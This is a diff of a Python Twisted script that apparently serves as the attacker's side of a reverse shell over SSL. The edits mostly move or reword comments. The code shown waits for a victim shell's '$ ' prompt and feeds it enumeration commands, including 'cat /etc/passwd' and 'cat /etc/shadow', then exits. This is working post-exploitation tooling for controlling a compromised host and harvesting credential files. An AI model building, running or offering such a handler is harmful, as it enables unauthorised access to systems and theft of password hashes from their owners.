@@ -6,10 +6,7 @@ enum_commands = ['whoami','id','hostname','cat /etc/passwd', 'cat /etc/shadow', 
 enum_commands.reverse()
 
 
-# Create a protocol to handle incoming connections
-# This is similar to the deal_with_client function in reverse_shell_handler.py
-# except that it is a class and the dataReceived method is called whenever data is received
-# from the client
+# Twisted is an event-driven networking engine written in Python and licensed under the open source MIT license.
 
 # The Protocol class is the base class for Twisted networking protocols.
 # It defines the basic interface between transports and higher-level protocols.
@@ -24,14 +21,14 @@ enum_commands.reverse()
 # See https://twistedmatrix.com/documents/current/api/twisted.internet.protocol.Protocol.html
 # for more information on the Protocol class
 
-# Wait for a connection a '$' prompt is received from the client
-# Send enumeration commands to the client
+
 
 class SSLProtocol(Protocol):
     
     # initialize the enumeration commands
 
     def __init__(self):
+        # Make a copy of the enumeration commands
         self.enum_commands = enum_commands.copy()
 
     def connectionMade(self):
@@ -40,13 +37,15 @@ class SSLProtocol(Protocol):
 
     def dataReceived(self, data):
         print('Received:', data.decode())
+        # Wait for a connection a prompt is received from the client
         if data.decode() == '$ ':
-            # Send one of the enumeration commands 
+            # If there are no more enumeration commands, exit
             if len(self.enum_commands) == 0:
                 self.send_command('exit\n')
                 self.transport.loseConnection()
                 return
             else:
+                # Send one of the enumeration commands
                 command = self.enum_commands.pop() + '\n'
                 self.send_command(command)
     
